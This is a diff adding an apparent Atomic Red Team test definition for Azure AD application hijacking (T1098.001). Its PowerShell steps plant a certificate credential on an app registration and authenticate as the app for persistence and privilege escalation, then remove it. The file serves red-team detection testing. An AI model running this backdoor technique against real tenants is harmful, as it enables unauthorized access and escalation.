@@ -1,0 +1,117 @@
+{
+  "id": "a12b5531-acab-4618-a470-0dafb294a87a",
+  "name": "Azure AD Application Hijacking - App Registration",
+  "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "989a82f7-2f0e-4ef4-b2ca-f383f830debc",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "13e15530-2c12-44cd-97fc-252ff28ae149",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5901168d-0ac9-422c-bec0-c8d67f02dde5",
+      "name": "Check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4d6143f3-bad3-4b4f-a74a-95f8a7186510",
+      "name": "Resolve dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AzureAD -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f4626d21-498f-481b-b988-c58eb12c3b5a",
+      "name": "Re-check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "989a82f7-2f0e-4ef4-b2ca-f383f830debc",
+      "p": "on-success",
+      "o": "13e15530-2c12-44cd-97fc-252ff28ae149"
+    },
+    {
+      "s": "989a82f7-2f0e-4ef4-b2ca-f383f830debc",
+      "p": "on-failure",
+      "o": "13e15530-2c12-44cd-97fc-252ff28ae149"
+    },
+    {
+      "s": "5901168d-0ac9-422c-bec0-c8d67f02dde5",
+      "p": "on-success",
+      "o": "989a82f7-2f0e-4ef4-b2ca-f383f830debc"
+    },
+    {
+      "s": "5901168d-0ac9-422c-bec0-c8d67f02dde5",
+      "p": "on-failure",
+      "o": "4d6143f3-bad3-4b4f-a74a-95f8a7186510"
+    },
+    {
+      "s": "4d6143f3-bad3-4b4f-a74a-95f8a7186510",
+      "p": "on-success",
+      "o": "f4626d21-498f-481b-b988-c58eb12c3b5a"
+    },
+    {
+      "s": "f4626d21-498f-481b-b988-c58eb12c3b5a",
+      "p": "on-failure",
+      "o": "989a82f7-2f0e-4ef4-b2ca-f383f830debc"
+    }
+  ],
+  "tags": [
+    "T1098.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "application_name",
+      "type": "string",
+      "description": "Name of the targeted application",
+      "value": "SuperApp"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "Azure AD username",
+      "value": "jonh@contoso.com"
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Azure AD password",
+      "value": "p4sswd"
+    }
+  ]
+}
